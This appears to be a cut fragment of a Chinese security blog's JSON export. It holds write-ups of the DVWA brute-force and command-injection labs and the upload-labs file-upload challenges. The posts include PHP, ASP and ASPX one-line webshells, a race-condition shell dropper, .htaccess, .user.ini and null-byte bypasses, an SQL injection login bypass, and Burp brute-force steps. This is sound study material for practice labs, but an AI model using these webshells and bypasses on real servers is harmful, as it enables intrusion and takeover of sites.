$octet[1] . &#x27;.&#x27; . $octet[2] . &#x27;.&#x27; . $octet[3]; // Determine OS and execute the ping command. if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123; // Windows $cmd = shell_exec( &#x27;ping &#x27; . $target ); &#125; else &#123; // *nix $cmd = shell_exec( &#x27;ping -c 4 &#x27; . $target ); &#125; // Feedback for the end user echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;; &#125; else &#123; // Ops. Let the user name theres a mistake echo &#x27;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#x27;; &#125;&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt;","tags":[{"name":"DVWA-labs","slug":"DVWA-labs","permalink":"http://example.com/tags/DVWA-labs/"}]},{"title":"upload-labs-pass14-21","date":"2021-02-20T04:27:30.000Z","path":"2021/02/20/upload-labs-pass14-21/","text":"[TOC] 前言从pass-14开始都是图片马搭配文件包含漏洞。 图片马的制作 使用cmd制作图片马：copy 1.jpg/b+1.php 2.jpg——意思是将1.jpg以二进制方式与1.php合并成2.jpg，这个2.jpg就是图片马了。 文件包含漏洞 -》文件包含简介：服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当作PHP来执行。 -》文件包含函数：PHP中文件包含函数有以下四种： 1.require()；2.require_once()；3.include()；4.include_once() include和require区别主要是，include在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而require函数出现错误的时候，会直接报错并退出程序的执行。 而include_once()，require_once()这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。 -》文件包含漏洞原理：文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码。 示例代码： &lt;?php $filename = $_GET[&#39;filename&#39;]; include($filename); ?&gt; 12345678910111213141516171819202122232425262728293031参考资料：https:&#x2F;&#x2F;blog.csdn.net&#x2F;Vansnc&#x2F;article&#x2F;details&#x2F;82528395# pass-14：文件头检查绕过* 查看源码，发现服务器只检查文件内容的前两个字节补充：一般文件内容的前两个字节会体现出自己是什么类型的文件（可以用winhex查看）。因此本pass直接上传图片马即可绕过了。* 图片马的利用： 一般图片马是无法直接连接蚁剑的，那么我们可以搭配文件包含漏洞来操作服务器。点开pass-14注意2的文件包含漏洞网页，url栏输入：?file&#x3D;.&#x2F;upload&#x2F;文件名![2](upload-labs-pass14&#x2F;2.png)# pass-15：突破getimagesize()查看源码：&#96;&#96;&#96;phpif(file_exists($filename))&#123; $info &#x3D; getimagesize($filename); $ext &#x3D; image_type_to_extension($info[2]);&#x2F;&#x2F;根据索引2的值转换为对应后缀 if(stripos($types,$ext)&gt;&#x3D;0)&#123; return $ext; &#125;else&#123; return false; &#125; &#125;else&#123; return false; &#125; 新函数： —）getimagesize() 功能：用于获取图像大小及相关信息，成功返回一个数组（成员为索引0、1、2、3等等），失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。 索引 0 给出的是图像宽度的像素值 索引 1 给出的是图像高度的像素值 索引 2 给出的是图像的类型，返回的是数字，其中1 = GIF，2 = JPG，3 = PNG，4 = SWF，5 = PSD，6 = BMP，7 = TIFF(intel byte order)，8 = TIFF(motorola byte order)，9 = JPC，10 = JP2，11 = JPX，12 = JB2，13 = SWC，14 = IFF，15 = WBMP，16 = XBM 索引 3 给出的是一个宽度和高度的字符串，可以直接用于 HTML 的 &lt;image标签 菜鸟教程实例： 那么这关也是直接上传图片马即可绕过。 pass-16：突破exif_imagetype() exif_imagetype()函数： 功能：读取一个图像的第一个字节并检查其签名。如果发现了恰当的签名则返回一个对应的常量，否则返回 FALSE。这个签名（也可以称为值）和 getimagesize() 返回的数组中的索引 2 的值是一样的，但本函数快得多。 那么这关也是直接上传图片马即可绕过。 pass-17：二次渲染绕过pass-18：条件竞争——时间型 代码审计：服务器先上传了图片，再判断后缀是否符合，符合则重命名，不符合则删除。 那么我们可以发现在我们上传了不符合的图片服务器保存到其删除肯定会有时间差的，那么我们就可以利用这一时间差进行我们的操作：上传新的一句话木马： &lt; ?php fputs(fopen(‘shell.php’,’w’),’&lt; ?php @eval($_POST[“pass”])?&gt;’);?&gt; 新函数： —）fputs() 函数——别名fwrite 功能：写入文件（可安全用于二进制文件） 语法：fputs(file,string,length) 参数 描述 file 必需。规定要写入的打开文件。 string 必需。规定要写入文件的字符串。 length 可选。规定要写入的最大字节数。 —）fopen()函数 功能：打开文件或者 URL。 语法：fopen(filename,mode,include_path,context) 参数 描述 filename 必需。规定要打开的文件或 URL。 mode 必需。规定要求到该文件/流的访问类型。可能的值见下表。 include_path 可选。如果也需要在 include_path 中检索文件的话，可以将该参数设为 1 或 TRUE。 context 可选。规定文件句柄的环境。Context 是可以修改流的行为的一套选项。 其中mode可选的类型有： mode 说明 “r” 只读方式打开，将文件指针指向文件头。 “r+” 读写方式打开，将文件指针指向文件头。 “w” 写入方式打开，将文件指针指向文件头并将文件大小截为零。如果文件不存在则尝试创建之。 “w+” 读写方式打开，将文件指针指向文件头并将文件大小截为零。如果文件不存在则尝试创建之。 “a” 写入方式打开，将文件指针指向文件末尾。如果文件不存在则尝试创建之。 “a+” 读写方式打开，将文件指针指向文件末尾。如果文件不存在则尝试创建之。 “x” 创建并以写入方式打开，将文件指针指向文件头。如果文件已存在，则 fopen() 调用失败并返回 FALSE，并生成一条 E_WARNING 级别的错误信息。如果文件不存在则尝试创建之。这和给底层的 open(2) 系统调用指定 O_EXCL|O_CREAT 标记是等价的。此选项被 PHP 4.3.2 以及以后的版本所支持，仅能用于本地文件。 “x+” 创建并以读写方式打开，将文件指针指向文件头。如果文件已存在，则 fopen() 调用失败并返回 FALSE，并生成一条 E_WARNING 级别的错误信息。如果文件不存在则尝试创建之。这和给底层的 open(2) 系统调用指定 O_EXCL|O_CREAT 标记是等价的。此选项被 PHP 4.3.2 以及以后的版本所支持，仅能用于本地文件。 把这个php文件通过burp一直不停的上传，总会有那么一瞬间是还没来得及删除就可以被访问到的（可以通过增加burpsuite线程来提高几率），一旦访问到该文件就会在当前目录下生成一个webshell2.0.php的一句话，然后用蚁剑连接shell.php即可。 pass-19：条件竞争pass-20 代码审计： 1234567891011121314151617181920212223242526 $is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;); $file_name = $_POST[&#x27;save_name&#x27;]; $file_ext = pathinfo($file_name,PATHINFO_EXTENSION); if(!in_array($file_ext,$deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH . &#x27;/&#x27; .$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125;else&#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125;else&#123; $msg = &#x27;禁止保存为该类型文件！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; 新函数： —）pathinfo()函数 功能：以数组的形式返回文件路径的信息 语法：pathinfo(path,process_sections) 参数 描述 path 必需。规定要检查的路径。 process_sections 可选。规定要返回的数组元素。默认是 all。可能的值：PATHINFO_DIRNAME - 只返回 dirname（目录路径）PATHINFO_BASENAME - 只返回 basename（文件名）PATHINFO_EXTENSION - 只返回 extension（文件名后缀） 感觉这关就是前面的黑名单绕过，打组合拳就好了。 pass-21 代码审计： 123456789101112131415161718192021222324252627282930313233$is_upload = false;$msg = null;if(!empty($_FILES[&#x27;upload_file&#x27;]))&#123; //检查MIME $allow_type = array(&#x27;image/jpeg&#x27;,&#x27;image/png&#x27;,&#x27;image/gif&#x27;); if(!in_array($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;],$allow_type))&#123; $msg = &quot;禁止上传该类型文件!&quot;; &#125;else&#123; //检查文件名 $file = empty($_POST[&#x27;save_name&#x27;]) ? $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;] : $_POST[&#x27;save_name&#x27;]; if (!is_array($file)) &#123; $file = explode(&#x27;.&#x27;, strtolower($file)); &#125; $ext = end($file); $allow_suffix = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;); if (!in_array($ext, $allow_suffix)) &#123; $msg = &quot;禁止上传该后缀文件!&quot;; &#125;else&#123; $file_name = reset($file) . &#x27;.&#x27; . $file[count($file) - 1]; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH . &#x27;/&#x27; .$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $msg = &quot;文件上传成功！&quot;; $is_upload = true; &#125; else &#123; $msg = &quot;文件上传失败！&quot;; &#125; &#125; &#125;&#125;else&#123; $msg = &quot;请选择要上传的文件！&quot;;&#125; 新函数： —）empty()函数 功能：用于检查一个变量是否为空。 —）explode()函数 功能：把字符串打散为数组。 语法：explode(separator,string,limit) 参数 描述 separator 必需。规定在哪里分割字符串。 string 必需。要分割的字符串。 limit 可选。规定所返回的数组元素的数目。可能的值：大于 0 - 返回包含最多 limit 个元素的数组；小于 0 - 返回包含除了最后的 -limit 个元素以外的所有元素的数组；0 - 返回包含一个元素的数组 —）is_array() 函数 功能：用于检测变量是否是一个数组。 —）end()函数 功能：将数组内部指针指向最后一个元素，并返回该元素的值（如果成功）。 语法：end(array) 参数 描述 array 必需。规定要使用的数组。 相关的函数： current() - 返回数组中的当前元素的值 next() - 将内部指针指向数组中的下一个元素，并输出 prev() - 将内部指针指向数组中的上一个元素，并输出 reset()- 将内部指针指向数组中的第一个元素，并输出 each() - 返回当前元素的键名和键值，并将内部指针向前移动 我们可以看到服务器先对上传的图片进行了MIME检查，然后判断save_name参数是否为空，为空就把文件本来名称赋值给$file,否则就是将save_name参数的值赋给$file。接着判断$file是否是数组，如果不是数组则拆除数组，将数组的最后一个元素（也就是后缀）和允许上传文件后缀相比，若符合则取$file数组的第一个元素加.和$file的第二个元素作为新的文件名，并将图片文件上传到指定路径。 补充知识：对于像.php/.这样的文件路径，move_uploaded_file()函数会忽略掉文件末尾的/.。如此一来我们上传到服务器的文件还是被重命名为了php后缀。 那么这关我们的想法是：提前将save_name设置为数组，即令save_name[0]=webshell.php/、save_name[2]=jpg，其中save_name[1]的值为空。这样就可令$file_name=webshell.php/.。但是这边有个疑问，save_name数组的元素个数不是三个吗，$file[count($file) - 1]=$file[2]啊。但是其实我们只对数组赋值了两个元素，因此count的值为2，这就相当于你有3个口袋，但是只有两个口袋有钱。 下面是实践：","tags":[{"name":"upload-labs","slug":"upload-labs","permalink":"http://example.com/tags/upload-labs/"}]},{"title":"DVWA—Brute Force","date":"2021-02-16T13:36:40.000Z","path":"2021/02/16/DVWA—Brute Force/","text":"前言该系列的实验主要围绕利用burpsuite的暴力破解。暴力破解，是指黑客利用密码字典，使用穷举法猜解出用户口令，是现在最为广泛使用的攻击手法之一。 Low查看源码： 1234$user = $_GET[ &#x27;username&#x27; ]; $pass = $_GET[ &#x27;password&#x27; ]; $pass = md5( $pass ); $query = &quot;SELECT * FROM `users` WHERE user = &#x27;$user&#x27; AND password = &#x27;$pass&#x27;;&quot;; 我们可以看到服务器对输入的账号密码没有做任何过滤处理，那么我们有两种方法： 1)SQL注入 输入username：admin’#，password：随便输。 2)暴力破解 输入目标账号和随意密码，抓包： ![1](DVWA—Brute Force/1.png) send to intruder，清除标记，对希望爆破的值标记：![2](DVWA—Brute Force/2.png) 选择payload，载入字典：![3](DVWA—Brute Force/3.png) start attack，我们可以看到当payload的值为password时回文的长度与众不同，因此我们得知用户admin的密码为password![4](DVWA—Brute Force/4.png) Medium查看源码： 1234567if(isset($_GET[&#x27;Login&#x27;]))&#123; $user=$_GET[&#x27;username&#x27;]; $user=mysql_real_escape_string($user); $pass=$_GET[&#x27;password&#x27;]; $pass=mysql_real_escape_string($pass);$pass=md5($pass);$query=&quot;SELECT*FROM`users`WHEREuser=&#x27;$user&#x27;ANDpassword=&#x27;$pass&#x27;;&quot;; 我们看到服务器对账号密码都做了过滤处理，对一些敏感字符进行了转义。实战中如果目标服务器的MySQL数据库采用gbk编码，那么我们可以里用宽字节绕过，但是我这边数据库没有这么设置，因此我们用SQL注入是不大可能实现了，我们接着看源码发现绕过我们输入了错误的账号密码，服务器也只会延迟网页两秒而已，不算有效的防爆破机制。一次本关仍使用暴力破解，具体同上一关。 High查看源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phpif( isset( $_GET[ &#x27;Login&#x27; ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; ); // Sanitise username input $user = $_GET[ &#x27;username&#x27; ]; $user = stripslashes( $user ); $user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Sanitise password input $pass = $_GET[ &#x27;password&#x27; ]; $pass = stripslashes( $pass ); $pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass = md5( $pass ); // Check database $query = &quot;SELECT * FROM `users` WHERE user = &#x27;$user&#x27; AND password = &#x27;$pass&#x27;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123; // Get users details $row = mysqli_fetch_assoc( $result ); $avatar = $row[&quot;avatar&quot;]; // Login successful echo &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;; echo &quot;&lt;img src=\\&quot;&#123;$avatar&#125;\\&quot; /&gt;&quot;; &#125; else &#123; // Login failed sleep( rand( 0, 3 ) ); echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; 补充—— $GLOBALS ：引用全局作用域中可用的全部变量。$GLOBALS 这种全局变量用于在 PHP 脚本中的任意位置访问全局变量（从函数或方法中均可）。PHP 在名为 $GLOBALS[index] 的数组中存储了所有全局变量。变量的名字就是数组的键。 通过代码审计我们可以看到，服务器使用了Anti-CSRF token来抵御CSRF的攻击，使用了stripslashes函数和mysqli_real_esacpe_string来抵御SQL注入和XSS的攻击。而且由于使用了Anti-CSRF token，每次服务器返回到登陆页面中都会包含一个随机的user_token的值，用户每次登录时都要将user_token一起提交。服务器收到请求后，会优先做token的检查，再进行sql查询。所以，我们不能再像low和medium级别一样，利用burpsuite进行无脑式的爆破了。 这关可以有两种解法，一种是利用paython脚本从html页面中抓取user_token的值（但是我还没学paython，等以后补吧），另一种是仍使用burp，因为即使我们输错密码， sleep( rand( 0, 3 ) )也只会网页延迟0到3秒，不足以防御暴力破解。但我们需要更换攻击模式等，我们下面展开来讲： 将攻击模式改为Pitchfork{草叉模式 ——它可以使用多组Payload集合，在每一个不同的Payload标志 位置上（最多20个），遍历所有的Payload。举例来说，如果有两个Payload标志位置， 第一个Payload值为A和B，第二个Payload值为a和b，则发起攻击时，将共发起两次攻 击，第一次使用的Payload分别为A和a，第二次使用的Payload分别为B和b。}并将password和user_token设为变量。![5](DVWA—Brute Force/5-1614780376113.png) 第一个变量password我们就照常载入字典就可以了。第二个变量user_token的payload设置我们选择Recursive grep 选项（Recursive grep——此Payload类型主要使用于从服务器端提取有效数据的场景，需要先从服务器的响应中提取数据作为Payload，然后替换Payload的位置，进行 攻击。它的数据来源了原始的响应消息，基于原始响应，在Payload的可选项设置 （Options）的 Grep-Extract中配置Grep规则，然后根据grep去提取数据才能发生攻击），然后我们在option 选项中找到 Grep-Extract ,点击 Add, 然后点击 Refetch repose 即可看到抓取到的源代码了，我们找到 user_token 的值value，选中它，之后点击ok。![6](DVWA—Brute Force/6.png) ![7](DVWA—Brute Force/7-1614781678680.png) 其实上述的操作只是为了达到一个目的：由于每次访问服务器后，user_token都会刷新，那么我们要让变量user_token”与时俱进“。 此外我们要将线程设为1，因为recursive grep payloads cannot be used with multiple request threads。同时 在 Options 中找到 Redirections 设置为 Always。做完这些准备操作，就可以点击start attack开始爆破， ![8](DVWA—Brute Force/8.png) 我们可以有两个值的回文长度异常，我们点击数据具体查看回文，发现密码为paaword时登入成功： ![9](DVWA—Brute Force/9.png)","tags":[{"name":"DVWA-labs","slug":"DVWA-labs","permalink":"http://example.com/tags/DVWA-labs/"}]},{"title":"upload-labs-pass1—13","date":"2021-02-09T11:32:20.000Z","path":"2021/02/09/upload-labs-pass1-13/","text":"[TOC] 前言upload-labs主要是一些针对文件上传漏洞的实验。 再正式开始之前，先了解一下什么是文件上传漏洞？ 文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。常见场景是web服务器允许用户上传图片或者普通文本文件保存，而用户绕过上传机制上传恶意代码并执行从而控制服务器。显然这种漏洞是getshell最快最直接的方法之一，需要说明的是上传文件操作本身是没有问题的，问题在于文件上传到服务器后，服务器怎么处理和解释文件。web应用程序通常带有文件上传的功能，比如在博客发表文章需要上传图片等行为就可能存在文件上传漏洞。文件上传漏洞就是利用网页代码中的文件上传路径变量过滤不严将，将可执行的文件上传到一个到服务器中，再通过URL去访问以执行恶意代码——攻击者可以直接上传WebShell（以asp、php或者jsp等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门）到服务器上。然后利用渗透工具（如蚁剑）连接webshell以达到操作服务器的目的。 上传漏洞类型大体可分为以下几类： 判断上传漏洞类型的思路： webshell（一句话木马）的制备 1模板： &lt;?php @eval($_POST[&#x27;password&#x27;]);?&gt; @表示后面即使执行错误，也不报错。eval（）函数表示括号内的语句字符串什么的全都当做代码执行。$_POST[&#39;password&#39;]表示从页面中用post的方式获得password这个参数值。 那么这句话的作用是什么呢？举个例子：password=echo ‘a’，就相当于&lt; ?php @eval(“echo ‘a’”);? &gt;即再网页上输出一个a。我们知道了这个就可以根据改变password的值来达到操控服务器的目的了，或者我们可以连接蚁剑，一键获取目标服务器。 补充： 入侵的条件 （1）木马上传成功，未被杀；（2）知道木马的路径在哪；（3）上传的木马能正常运行。 常见的一句话木马 php的一句话木马： &lt; ?php @eval($_POST[‘pass’]);? &gt;asp的一句话是： &lt;%eval request (“pass”)%&gt;aspx的一句话是： &lt;%@ Page Language=”Jscript”%&gt; &lt;%eval(Request.Item[“pass”],”unsafe”);%&gt; pass-01：js检查打开pass-01的index.php查看源码，我们看到网页对上传的图片做了js检查， 而且设置了上传白名单， 因此题目要求我们上传一个webshell到服务器上，我们可以有以下三种思路： 删除那段有关js检查的代码 增加白名单中可上传文件类型 先将上传文件类型改为白名单的一种（使其通过js检查）然后用burp抓包，再将其文件后缀更改为预期文件类型 pass-02：MIME绕过 查看提示：本pass在服务端对数据包的MIME进行检查。 MIME：MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。在HTTP中，MIME类型被定义在Content-Type header中。 常见的MIME类型： udio/mpeg -&gt; .mp3application/msword -&gt; .docapplication/octet-stream -&gt; .exeapplication/pdf -&gt; .pdfapplication/x-javascript -&gt; .jsapplication/x-rar -&gt; .rarapplication/zip -&gt; .zipimage/gif -&gt; .gifimage/jpeg -&gt; .jpg / .jpegimage/png -&gt; .pngtext/plain -&gt; .txttext/html -&gt; .htmlvideo/mp4 -&gt; .mp4 查看源码： 也就是说服务器还是规定了白名单，那么我们可以有以下两种思路： 1.先将webshell后缀类型改为允许上传的文件后缀类型（使其绕过MIME检查），然后burp抓包，将webshell后缀改回.php。 2.将webshell.php文件上传，burp抓包，将Content-Type的MIME类型改为白名单中的类型。 sp：我在看源码的时候发现这关的源码也存在js检查的源码，但是我发现把这段码删了并不能实现上传webshell，因为源码中没有规定checkfile()的作用，而且服务器是通过if语句判断上传文件类型是否符合。 pass-03：上传特殊可解析后缀 查看源码： 123456789101112131415161718192021222324252627$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&#x27;.asp&#x27;,&#x27;.aspx&#x27;,&#x27;.php&#x27;,&#x27;.jsp&#x27;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if(!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; 我们可以看到服务器对上传文件做了很多过滤处理，包括设定了黑名单。 这边我们补充一个知识点：Apache解析顺序是从右到左开始解析文件后缀，如果最右侧扩展名不能识别的话，就继续往左判断，直到遇到可以解析的文件后缀为止。而且Apache的httpd.conf中可以进行配置（AddType application/x-httpd-php .php .php3 .phtml），规定哪些文件后缀是以php格式来解析的。 ​ 我们看到黑名单中没有禁用这些可解析后缀，因此我们可以利用这一点，上传可解析后缀。 sp：常用可解析后缀 陌生函数： ！strrchr() 函数 功能：查找字符，在指定字符串中从后面开始的第一次出现的位置，如果成功，则返回从该位置到字符串结尾的所有字符，如果失败，则返回 false。 语法：strrchr(string，char) 参数 描述 string 必需。规定被搜索的字符串。 char 必需。规定要查找的字符。如果该参数是数字，则搜索匹配数字 ASCII 值的字符。 ！trim()函数 功能：除去字符串开头和末尾的空格或其他字符。 语法：trim (string $str [,string $charlist ]) 参数 描述 string 必需。规定要检查的字符串。 charlist 可选。规定从字符串中删除哪些字符。如果省略该参数，则移除下列所有字符：”\\0” - NULL ；”\\t” - 制表符； “\\n” - 换行； “\\x0B” - 垂直制表符； “\\r” - 回车 ；” “ - 空格 ！in_array()函数 功能：搜索数组中是否存在指定的值。 语法：in_array(search,array,type) 参数 描述 search 必需。规定要在数组搜索的值。 array 必需。规定要搜索的数组。 type 可选。如果设置该参数为 true，则检查搜索的数据与数组的值的类型是否相同。如果 search 参数是字符串且 type 参数被设置为 TRUE，则搜索区分大小写。 ！move_uploaded_file() 函数 功能：将上传的文件移动到新位置。 语法：move_uploaded_file(file,newloc) 参数 描述 file 必需。规定要移动的文件。 newloc 必需。规定文件的新位置。 注：这关我没能实现在本地复现，上传shell后用蚁剑连接不上，好像是Apache的版本不能太高。 ！str_ireplace() 函数 功能：替换字符串中的一些字符（不区分大小写）。 语法：str_ireplace(find,replace,string,count) 参数 描述 find 必需。规定要查找的值。 replace 必需。规定替换 find 中的值的值。 string 必需。规定被搜索的字符串。 count 可选。一个变量，对替换数进行计数。 pass-04：上传.htaccess 这关的黑名单添加了可解析后缀，但是忽略了.htaccess类型。 htaccess文件是Apache服务器中的一个配置文件，负责相关目录下网页配置，可以帮我们实现网页301重定向，自定义404错误页面，改变文件扩展名等功能。其中.htaccess文件内容:SetHandler application/x-httpd-php设置当前目录所有文件都使用PHP解析，无论上传任何类型文件，只要文件内容符合php语言代码规范，就会被当做php文件执行。 因此这关的思路是：先上传一个后缀为.htaccess，内容为：SetHandler application/x-httpd-php ​ &lt;FilesMatch “webshell.jpg”&gt; 或 SetHandler application/x-httpd-php 的文件，然后再上传webshell.jpg即可。 ​ 注：这关我没能实现在本地复现，上传shell后用蚁剑连接不上，好像是Apache的版本不能太高。 pass-05 pass-04是利用Apache的解析文件进行绕过黑名单，这关则是利用PHP的解析方式绕过黑名单。 我们看到黑名单里又多加了一个htaccess类型，但是php配置文件类型php.ini没有被禁用，且提示告诉我们上传目录存在php文件（readme.php）。 那么这关的思路：先上传一个后缀为.user.ini（相当于用户自定义的php.ini）内容为 auto_prepend_file=webshell.png（意思是该目录下的所有php文件都包含webshell.png），然后我们再上传webshell.png，最后用蚁剑连接时我们要注意连接的是readme.php（因为其文件内容包含shell）而不是webshell.png。 但是这里我其实有个疑问：那就是我们在现实渗透的时候又怎么会知道靶机的上传目录是否存在.php类型文件，以及.php文件的文件名呢？挖个坑！！！！！！！！！！！！！！！！！！！！！！！！！！！ pass-06：后缀大小写绕过 这关我们查看源码发现，它的黑名单已经相当齐全了，但是它相对前几关删了一个函数：strtolower()。其作用就是把所有字符全部转为小写字母。 那么这关利用这一漏洞，上传webshell.phP文件，然后蚁剑连接即可。 pass-07：空格绕过 查看源码发现它删去了trim()函数。 这边补一个知识：在win系统下呢，如果文件后缀最后面是空格、点、：：$DATA会自动省去，也就是说在客户端目录下的是文件名是”干净”。那么我们这关的思路是：上传webshell.php文件然后抓包，在后缀后加一个空格。 那么这关的思路就是：先上传webshell.php，抓包，在后缀后加个空格 sp：没能复现 pass-08：点绕过 查看源码发现它删去了deldot()函数。原理同pass-07 那么这关的思路就是：上传webshell.php然后抓包，在后缀后加个点（.） pass-09：::$DATA绕过 查看源码发现少了对::$DATA的过滤。 DATA(NTFS文件系统的存储数据流的一个属性)NTFS文件系统包括对备用数据流的支持,备用数据流允许文件包含多个数据流，每个文件至少有一个数据流。在Windows中，这个默认数据流称为：$DATA,当我们访问1.php::$DATA 时，就是请求 1.php 本身的数据，如果a.php 还包含了其他的数据流，比如a.php:lake2.php，请求1.php:lake2.php::$DATA，则是请求1.php中的流数据lake2.php的流数据内容。 那么我们这关的思路是：先webshell.php，抓包，后缀后添加::DATA，最后蚁剑连接。 pass-10 这关查看源码发现过滤的都过滤了，但是和以往有一点不同：上传位置表达方式改变 旧：$img_path = UPLOAD_PATH.’/‘.date(“YmdHis”).rand(1000,9999).$file_ext; 新：$img_path = UPLOAD_PATH.’/‘.$file_name; sp：没能复现 pass-11：双后缀名绕过我们查看源码，发现关键句：$file_name = str_ireplace($deny_ext,””, $file_name);意思是查找上传的文件名中是否存在黑名单中的值，如果存在就删去。 那么这关我们的思路是：上传webshell.php，抓包，后缀更改为pphphp pass-12：%00截断（get型）查看这关的源码，发现上传位置表达方式改变了——$img_path = $_GET[‘save_path’].”/“.rand(10, 99).date(“YmdHis”).”.”.$file_ext; 我们可以发现save_pasth是可控路径，有点像sql注入里?id=。 先补充知识： 1.php语法中，当一个字符串中存在空字符时，会导致空字符后面的字符被丢弃（误把它当成结束符），后面的数据直接忽略，这就导致漏洞产生。 2.%00是对ascii码中的0对应的字符编码后的结果，0x00则是%00解码成的16进制。当url中的参数是通过GET方式获取时，%00会被自动解码。当通过POST方式获取时，不会自动解码，%00只会原样被当成字符串来输出。所以通过POST方式请求时，我们需要手动将它改写为十六进制0x00。 那么这关我们的思路就是：上传webshell.png，抓包，令save_pasth=../upload/webshell.php%00 sp：strrpos()函数 功能：strrpos() 函数查找字符串在另一字符串中最后一次出现的位置。返回字符（字符串）在目标字符串中最后一次出现的位置，如果没有找到字符串则返回 FALSE。字符串位置从 0 开始，不是从 1 开始。 语法：strrpos(string,find,start) 参数 描述 string 必需。规定被搜索的字符串。 find 必需。规定要查找的字符。 start 可选。规定在何处开始搜索。 pass-13：0x00截断（post型）法一：同pass-12 法二：上传webshell.png，抓包 